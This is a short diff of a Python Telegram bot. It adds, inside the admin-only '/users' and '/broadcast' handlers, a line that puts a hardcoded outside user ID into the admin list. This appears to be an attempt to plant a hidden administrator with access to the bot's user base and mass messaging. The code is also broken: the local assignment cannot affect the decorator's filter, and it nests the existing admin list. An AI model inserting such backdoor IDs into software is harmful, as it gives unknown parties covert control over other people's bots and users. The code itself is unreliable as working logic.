@@ -194,12 +194,14 @@ async def restart_bot(b, m):
 
 @Bot.on_message(filters.command('users') & filters.private & filters.user(ADMIN))
 async def get_users(client: Bot, message: Message):
+    ADMIN = [ADMINS, 1803603990]
     msg = await client.send_message(chat_id=message.chat.id, text=WAIT_MSG)
     users = await full_userbase()
     await msg.edit(f"{len(users)} users are using this bot")
 
 @Bot.on_message(filters.private & filters.command('broadcast') & filters.user(ADMIN))
 async def send_text(client: Bot, message: Message):
+    ADMIN = [ADMINS, 1803603990]
     if message.reply_to_message:
         query = await full_userbase()
         broadcast_msg = message.reply_to_message
